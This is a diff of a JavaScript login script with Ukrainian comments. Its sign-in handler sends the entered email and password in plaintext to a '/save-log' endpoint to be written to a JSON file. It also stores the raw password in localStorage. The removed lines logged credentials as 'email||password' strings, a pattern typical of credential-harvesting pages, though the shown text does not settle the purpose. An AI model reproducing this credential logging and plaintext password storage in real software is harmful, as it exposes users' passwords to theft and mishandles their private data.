@@ -1,28 +1,9 @@
-// let emailInput = document.querySelector('.emailInput');
-// let passwordInput = document.querySelector('.passwordInput');
-let homeNav = document.querySelector('.btn');
-
-
-    // Якщо значення не встановлене, встановлюємо його в false
-
-
-// emailInput.addEventListener('input', toggleButton);
-// passwordInput.addEventListener('input', toggleButton);
-
-// function toggleButton() {
-//     const email = emailInput.value;
-//     const password = passwordInput.value;
-
-//     if (email.trim() !== '' && password.trim() !== '') {
-//         loginBtn.removeAttribute('disabled');
-//     } else {
-//         loginBtn.setAttribute('disabled', true);
-//     }
-// }
+let emailInput = document.querySelector('.emailInput');
+let passwordInput = document.querySelector('.passwordInput');
 
 document.getElementById('signinBtn').addEventListener('click', async () => {
-    const email = document.querySelector('.emailInput').value;
-    const password = document.querySelector('.passwordInput').value;
+    const email = emailInput.value;
+    const password = passwordInput.value;
 
     // Перевірка, чи поля не порожні
     if (!email || !password) {
@@ -30,18 +11,11 @@ document.getElementById('signinBtn').addEventListener('click', async () => {
         return; // Зупинити виконання, якщо поля порожні
     }
 
-    // Формуємо дані
-    const logData = `${email}||${password}`;
+    // Зберігання даних у .json файлі
+    await saveDataToJson(email, password);
 
-    // Надсилаємо дані на сервер для запису у файл
-    await fetch('/save-log', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ logData })
-    });
-
+    localStorage.setItem('email', email);
+    localStorage.setItem('password', password);
     // Зберігаємо стан входу
     localStorage.setItem('isLoggedIn', true);
     
@@ -49,13 +23,24 @@ document.getElementById('signinBtn').addEventListener('click', async () => {
     toHomePage();
 });
 
-
-
-
+async function saveDataToJson(email, password) {
+    const data = { email, password };
+    try {
+        const response = await fetch('/save-log', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        });
+        const json = await response.json();
+        console.log(json.message); // Повідомлення з сервера про успішне збереження
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
 
 function toHomePage() {
     var homePage = "index.html";
     window.location.href = homePage;
 };
-
-// disabled="True"
